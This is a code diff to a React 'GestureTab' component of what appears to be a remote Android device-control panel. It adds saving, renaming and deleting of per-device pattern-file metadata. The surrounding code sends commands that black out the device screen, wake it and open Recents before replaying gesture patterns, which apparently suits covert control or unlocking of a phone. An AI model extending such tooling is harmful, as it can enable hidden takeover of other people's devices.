@@ -750,10 +750,18 @@ function AdvancedReplayCanvas({ cells, cellCoords, active, width = 300, height =
 
 const formatDur = ms => ms < 1000 ? `${ms}ms` : `${(ms / 1000).toFixed(1)}s`;
 const formatTime = ms => ms ? formatDateTime(ms, '') : '';
+const patternMetadataHeaders = (json = false) => {
+  const token = localStorage.getItem('admin_token') || localStorage.getItem('user_token');
+  return {
+    ...(json ? { 'Content-Type': 'application/json' } : {}),
+    ...(token ? { Authorization: `Bearer ${token}` } : {}),
+  };
+};
 
 export default function GestureTab({ device, sendCommand, results }) {
   const deviceId = device?.deviceId;
   const isOnline = device?.isOnline;
+  const activeDeviceIdRef = useRef(deviceId);
 
   const [gestures, setGestures]         = useState([]);
   const [loading, setLoading]           = useState(false);
@@ -788,6 +796,11 @@ export default function GestureTab({ device, sendCommand, results }) {
   const [advSelectedFile, setAdvSelectedFile]   = useState(null);
   const [advSelectedData, setAdvSelectedData]   = useState(null);
   const [uploadedPatterns, setUploadedPatterns]   = useState([]);
+  const [savedPatternMetadata, setSavedPatternMetadata] = useState([]);
+  const [metadataLoading, setMetadataLoading] = useState(false);
+  const [metadataSavingId, setMetadataSavingId] = useState(null);
+  const [editingMetadataId, setEditingMetadataId] = useState(null);
+  const [metadataNameDraft, setMetadataNameDraft] = useState('');
 
   const deviceW = device?.deviceInfo?.screenWidth  || 720;
   const deviceH = device?.deviceInfo?.screenHeight || 1600;
@@ -806,6 +819,47 @@ export default function GestureTab({ device, sendCommand, results }) {
       if (livePollingRef.current) clearInterval(livePollingRef.current);
     };
   }, []);
+
+  useEffect(() => {
+    activeDeviceIdRef.current = deviceId;
+    setSavedPatternMetadata([]);
+    setMetadataLoading(!!deviceId);
+    setMetadataSavingId(null);
+    setEditingMetadataId(null);
+    setMetadataNameDraft('');
+    setUploadedPatterns(previous => previous.map(pattern => {
+      const currentPattern = { ...pattern };
+      delete currentPattern.metadataId;
+      return currentPattern;
+    }));
+    if (!deviceId) return undefined;
+
+    const controller = new AbortController();
+    const url = `/api/devices/${encodeURIComponent(deviceId)}/pattern-upload-metadata`;
+    fetch(url, { headers: patternMetadataHeaders(), signal: controller.signal })
+      .then(async response => {
+        const data = await response.json();
+        if (!response.ok || !data.success) throw new Error(data.error || 'Could not load saved metadata');
+        const records = Array.isArray(data.metadata) ? data.metadata : [];
+        setSavedPatternMetadata(records);
+        setUploadedPatterns(previous => previous.map(pattern => {
+          const match = records.find(record =>
+            record.sourceFileName === pattern.fileName
+            && record.screenWidth === pattern.screenWidth
+            && record.screenHeight === pattern.screenHeight
+          );
+          return match ? { ...pattern, metadataId: match._id } : pattern;
+        }));
+      })
+      .catch(error => {
+        if (!controller.signal.aborted) status(`Could not load saved metadata: ${error.message}`);
+      })
+      .finally(() => {
+        if (!controller.signal.aborted) setMetadataLoading(false);
+      });
+
+    return () => controller.abort();
+  }, [deviceId]);
 
   const loadList = useCallback(() => {
     setLoading(true);
@@ -1092,9 +1146,105 @@ export default function GestureTab({ device, sendCommand, results }) {
     status(statusParts.join('. '));
   }
 
-  function sendUploadedPattern() {
+  async function savePatternMetadata(pattern) {
+    if (!deviceId) { status('Select a device before saving metadata'); return; }
+    const targetDeviceId = deviceId;
+    setMetadataSavingId(pattern.id);
+    try {
+      const response = await fetch(
+        `/api/devices/${encodeURIComponent(targetDeviceId)}/pattern-upload-metadata`,
+        {
+          method: 'POST',
+          headers: patternMetadataHeaders(true),
+          // Only non-sensitive file metadata is persisted. Pattern cells,
+          // coordinates, and the JSON contents remain in this browser session.
+          body: JSON.stringify({
+            fileName: pattern.fileName,
+            screenWidth: pattern.screenWidth,
+            screenHeight: pattern.screenHeight,
+          }),
+        },
+      );
+      const data = await response.json();
+      if (!response.ok || !data.success || !data.metadata) {
+        throw new Error(data.error || 'Could not save metadata');
+      }
+      if (activeDeviceIdRef.current !== targetDeviceId) return;
+      const metadata = data.metadata;
+      setSavedPatternMetadata(previous => [
+        metadata,
+        ...previous.filter(record => record._id !== metadata._id),
+      ]);
+      setUploadedPatterns(previous => previous.map(item =>
+        item.id === pattern.id ? { ...item, metadataId: metadata._id } : item
+      ));
+      status(`Saved metadata for ${metadata.displayName} on ${device.deviceName || deviceId}`);
+    } catch (error) {
+      if (activeDeviceIdRef.current === targetDeviceId) {
+        status(`Could not save metadata: ${error.message}`);
+      }
+    } finally {
+      if (activeDeviceIdRef.current === targetDeviceId) setMetadataSavingId(null);
+    }
+  }
+
+  async function renameSavedPatternMetadata(metadataId) {
+    const targetDeviceId = deviceId;
+    const displayName = metadataNameDraft.trim();
+    if (!displayName) { status('Enter a display name'); return; }
+    try {
+      const response = await fetch(
+        `/api/devices/${encodeURIComponent(targetDeviceId)}/pattern-upload-metadata/${encodeURIComponent(metadataId)}`,
+        {
+          method: 'PATCH',
+          headers: patternMetadataHeaders(true),
+          body: JSON.stringify({ displayName }),
+        },
+      );
+      const data = await response.json();
+      if (!response.ok || !data.success || !data.metadata) {
+        throw new Error(data.error || 'Could not rename saved metadata');
+      }
+      if (activeDeviceIdRef.current !== targetDeviceId) return;
+      setSavedPatternMetadata(previous => previous.map(record =>
+        record._id === metadataId ? data.metadata : record
+      ));
+      setEditingMetadataId(null);
+      setMetadataNameDraft('');
+      status('Saved metadata name updated');
+    } catch (error) {
+      if (activeDeviceIdRef.current === targetDeviceId) {
+        status(`Could not rename saved metadata: ${error.message}`);
+      }
+    }
+  }
+
+  async function deleteSavedPatternMetadata(record) {
+    if (!window.confirm(`Delete saved metadata "${record.displayName}" for this device?`)) return;
+    const targetDeviceId = deviceId;
+    try {
+      const response = await fetch(
+        `/api/devices/${encodeURIComponent(targetDeviceId)}/pattern-upload-metadata/${encodeURIComponent(record._id)}`,
+        { method: 'DELETE', headers: patternMetadataHeaders() },
+      );
+      const data = await response.json();
+      if (!response.ok || !data.success) throw new Error(data.error || 'Could not delete saved metadata');
+      if (activeDeviceIdRef.current !== targetDeviceId) return;
+      setSavedPatternMetadata(previous => previous.filter(item => item._id !== record._id));
+      setUploadedPatterns(previous => previous.map(pattern =>
+        pattern.metadataId === record._id ? { ...pattern, metadataId: null } : pattern
+      ));
+      status('Saved metadata deleted');
+    } catch (error) {
+      if (activeDeviceIdRef.current === targetDeviceId) {
+        status(`Could not delete saved metadata: ${error.message}`);
+      }
+    }
+  }
+
+  function prepareDeviceForPattern() {
     if (uploadedPatterns.length === 0) { status('Upload a pattern file first'); return; }
-    status('Block screen → wake → recents sequence starting…');
+    status('Preparing device: block screen → wake → Recents…');
     sendCmd('screen_blackout_on');
     setTimeout(() => { sendCmd('wake_screen'); status('Woke screen…'); }, 1000);
     setTimeout(() => { sendCmd('press_recents'); status('Pressed recents…'); }, 2000);
@@ -1387,22 +1537,129 @@ export default function GestureTab({ device, sendCommand, results }) {
                               })}
                             </div>
                           </details>
+                          <button
+                            type="button"
+                            onClick={() => savePatternMetadata(pattern)}
+                            disabled={!deviceId || !!pattern.metadataId || metadataSavingId !== null}
+                            style={{
+                              ...btnStyle('#0f766e', !deviceId || !!pattern.metadataId || metadataSavingId !== null),
+                              marginTop: 10,
+                              width: '100%',
+                            }}
+                          >
+                            {metadataSavingId === pattern.id
+                              ? 'Saving metadata…'
+                              : pattern.metadataId
+                                ? 'Metadata saved for this device'
+                                : 'Save metadata for this device'}
+                          </button>
                         </div>
                       </div>
                     ))}
                   </div>
 
                   <button
-                    onClick={sendUploadedPattern}
+                    onClick={prepareDeviceForPattern}
                     disabled={!isOnline}
                     style={{ ...btnStyle('#7c3aed', !isOnline), marginTop: 12, padding: '8px 18px' }}
                   >
-                    Send Pattern (block → wake → recents)
+                    Prepare Device (block → wake → Recents)
                   </button>
                 </>
               ) : (
                 <div style={{ color: '#475569', fontSize: 12, textAlign: 'center', padding: '24px 12px', border: '1px dashed #334155', borderRadius: 8 }}>
                   No pattern files loaded yet
+                </div>
+              )}
+
+              {deviceId && (
+                <div style={{ marginTop: 16, background: '#0f172a', border: '1px solid #334155', borderRadius: 10, padding: 14 }}>
+                  <div style={{ fontSize: 12, fontWeight: 700, color: '#cbd5e1', marginBottom: 5 }}>
+                    Saved metadata for {device?.deviceName || deviceId}
+                  </div>
+                  <div style={{ fontSize: 10, color: '#64748b', lineHeight: 1.5, marginBottom: 10 }}>
+                    Only the display name, source filename, and screen dimensions are stored. Pattern cells, coordinates, and file contents are not saved.
+                  </div>
+                  {metadataLoading ? (
+                    <div style={{ color: '#64748b', fontSize: 11 }}>Loading saved metadata…</div>
+                  ) : savedPatternMetadata.length === 0 ? (
+                    <div style={{ color: '#475569', fontSize: 11 }}>No metadata saved for this device.</div>
+                  ) : (
+                    <div style={{ display: 'grid', gap: 8 }}>
+                      {savedPatternMetadata.map(record => (
+                        <div
+                          key={record._id}
+                          style={{
+                            display: 'flex',
+                            alignItems: 'center',
+                            flexWrap: 'wrap',
+                            gap: 8,
+                            padding: '9px 10px',
+                            borderRadius: 8,
+                            border: '1px solid #1e293b',
+                            background: '#111827',
+                          }}
+                        >
+                          {editingMetadataId === record._id ? (
+                            <>
+                              <input
+                                type="text"
+                                value={metadataNameDraft}
+                                onChange={event => setMetadataNameDraft(event.target.value)}
+                                maxLength={120}
+                                aria-label={`Rename ${record.displayName}`}
+                                style={{
+                                  flex: '1 1 180px',
+                                  minWidth: 0,
+                                  background: '#0b1220',
+                                  color: '#e2e8f0',
+                                  border: '1px solid #475569',
+                                  borderRadius: 6,
+                                  padding: '6px 8px',
+                                }}
+                              />
+                              <button type="button" onClick={() => renameSavedPatternMetadata(record._id)} style={btnStyle('#2563eb')}>
+                                Save name
+                              </button>
+                              <button
+                                type="button"
+                                onClick={() => { setEditingMetadataId(null); setMetadataNameDraft(''); }}
+                                style={btnStyle('#334155')}
+                              >
+                                Cancel
+                              </button>
+                            </>
+                          ) : (
+                            <>
+                              <div style={{ minWidth: 0, flex: '1 1 220px' }}>
+                                <div style={{ color: '#e2e8f0', fontSize: 11, fontWeight: 600, overflowWrap: 'anywhere' }}>
+                                  {record.displayName}
+                                </div>
+                                <div style={{ color: '#64748b', fontSize: 10, marginTop: 3, overflowWrap: 'anywhere' }}>
+                                  {record.sourceFileName} · {record.screenWidth} × {record.screenHeight}px
+                                  {record.createdAt ? ` · saved ${formatDateTime(record.createdAt, '')}` : ''}
+                                </div>
+                              </div>
+                              <button
+                                type="button"
+                                onClick={() => { setEditingMetadataId(record._id); setMetadataNameDraft(record.displayName); }}
+                                style={btnStyle('#334155')}
+                              >
+                                Rename
+                              </button>
+                              <button
+                                type="button"
+                                onClick={() => deleteSavedPatternMetadata(record)}
+                                style={btnStyle('#7f1d1d')}
+                              >
+                                Delete
+                              </button>
+                            </>
+                          )}
+                        </div>
+                      ))}
+                    </div>
+                  )}
                 </div>
               )}
             </div>
